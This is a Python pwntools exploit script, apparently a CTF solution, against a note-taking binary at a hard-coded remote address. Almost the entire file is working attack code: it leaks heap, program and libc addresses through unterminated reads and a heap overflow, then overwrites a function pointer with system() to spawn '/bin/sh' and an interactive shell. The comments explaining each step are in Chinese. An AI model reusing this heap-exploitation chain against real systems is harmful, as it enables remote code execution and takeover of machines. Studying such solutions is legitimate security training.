from pwn import *
import time, sys


# local process envirnoment
LOCAL = False
elf_name = "./pwn3_ok"

#retmote args
remote_host = "54.222.255.223"
remote_port = 50003
#remote_host = "127.0.0.1"
#remote_port = 20000
context.clear(arch="amd64")
elf = ELF(elf_name)

if LOCAL:
    free_offset = 0x83940
    system_offset = 0x45390
    smlbin_area_off = 0x3C3B78
    execv_binsh_off = 0xF0567
    malloc_hook_off = 0x3C3B10
    context.log_level = "debug"
    mine_env = os.environ
    # mine_env['LD_PRELOAD'] = "/home/deadfish/Pwn/Tools/preeny/x86_64-linux-gnu/dealarm.so:./libc.so.6"
    mine_env['LD_PRELOAD'] = "/home/deadfish/Pwn/Tools/preeny/x86_64-linux-gnu/dealarm.so:"
    io = process(elf_name, env=mine_env)
else:
    context.log_level = "debug"
    free_offset = 0x7B8B0
    system_offset = 0x3E760
    io = remote(remote_host, remote_port)

def dlySend(sdstr):
    io.send(sdstr)
    time.sleep(0.01)

def mmenu(mopt):
    io.recvuntil("$ ")
    io.sendline(mopt)

def add_note(msize, mname, mcontent):
    mmenu("new")
    io.recvuntil("$ note size:")
    io.sendline(str(msize))
    io.recvuntil("$ note name:")
    dlySend(mname)
    io.recvuntil("$ note content:")
    dlySend(mcontent)

def edit_note(mid, mname, mcontent):
    mmenu("edit")
    io.recvuntil("$ note index:")
    io.sendline(str(mid))
    io.recvuntil("$ note name:")
    dlySend(mname)
    io.recvuntil("$ note content:")
    dlySend(mcontent)

def del_note(mindex):
    mmenu("delete")
    io.recvuntil("$ note index:")
    io.sendline(str(mindex))

def show_note(mindex):
    mmenu("show")
    io.recvuntil("$ note index:")
    io.sendline(str(mindex))

def exit_nn():
    mmenu("exit")

def mark_nt(mindex, minfo):
    mmenu("mark")
    io.recvuntil("$ index of note you want to mark:")
    io.sendline(str(mindex))
    io.recvuntil("$ mark info:")
    dlySend(minfo)

def show_mark(mindex):
    mmenu("show_mark")
    io.recvuntil("$ mark index:")
    io.sendline(str(mindex))

def del_mark():
    mmenu("delete_mark")
    io.recvuntil("$ mark index:")
    io.sendline(str(mindex))

def edit_mark(mindex, minfo):
    mmenu("edit_mark")
    io.recvuntil("$ mark index:")
    io.sendline(str(mindex))
    io.recvuntil("$ mark content:")
    dlySend(minfo)

# 泄露堆地址 利用read结尾不清0
def s_leak():
    for i in range(8):
        tmp_name = chr(0x30+i)*0x20
        tmp_content = chr(0x41+i)*0x22 + '\n'
        add_note(0x100, tmp_name, tmp_content)
    show_note(1)
    io.recvuntil("name:"+'1'*0x20)
    data = io.recvuntil('\n')[:-1]
    lk_heap_addr = u64(data.ljust(8, chr(0))) - 0x1a0
    log.info("heap base addr: "+hex(lk_heap_addr))
    return lk_heap_addr

# 泄露主函数地址 利用堆溢出
def s_lk_main(lk_heap_addr):
    # 559271704000 559271704B40
    for i in range(4):
        tmp_info = "/bin/sh" + '\n'
        mark_nt(i, tmp_info)
    payload = 'c'*0x20
    payload += p64(0) + p64(0x21)
    payload += p32(2) + p32(0x20)
    payload += p64(lk_heap_addr+0xB40)  # funcdis addr
    edit_mark(1, payload)

    show_mark(2)
    data = io.recvline()[:-1]
    lk_func_addr = u64(data.ljust(8, chr(0)))
    log.info("function addr: "+hex(lk_func_addr))
    return lk_func_addr

def s_exp():
    heap_bs_addr = s_leak()
    mpts_faddr = s_lk_main(heap_bs_addr)
    bss_nt_lst = mpts_faddr + 0x20245D
    log.info("bss addr: "+hex(bss_nt_lst))

    # change list ptr
    # 泄露libc
    payload = 'c'*0x20
    payload += p64(0) + p64(0x21)
    payload += p32(2) + p32(0x20)
    payload += p64(mpts_faddr+0x2022F5)
    edit_mark(1, payload)
    show_mark(2)
    data = io.recvline()[:-1]
    libc_addr = u64(data.ljust(8, chr(0))) - free_offset
    log.info("libc addr: "+hex(libc_addr))
    system_addr = system_offset + libc_addr
    pause()
    # 改变函数指针
    payload = 'c'*0x20
    payload += p64(0) + p64(0x21)
    payload += p32(2) + p32(0x20)
    payload += p64(heap_bs_addr+0xB38)
    edit_mark(1, payload)
    payload = p64(heap_bs_addr+0xB50) + p64(system_addr) + '\n'
    edit_mark(2, payload)
    show_mark(2)
    io.interactive()
    '''
    # free small bin
    payload = p64(heap_bs_addr+0x50) + '\n'
    edit_mark(2, payload)
    del_note(7)
    # leak libc
    payload = 'c'*0x20
    payload += p64(0) + p64(0x21)
    payload += p32(2) + p32(0x20)
    payload += p64(bss_nt_lst+0x58)
    edit_mark(1, payload)
    show_mark(6)
    # 7FCFEE8A3B78 - 7FCFEE4E0000
    io.recvall()
    #edit_mark(2, payload)
    # 5564E6919C43 5564E6B1C0A0
    '''

if __name__ == "__main__":
    s_exp()
    pause()
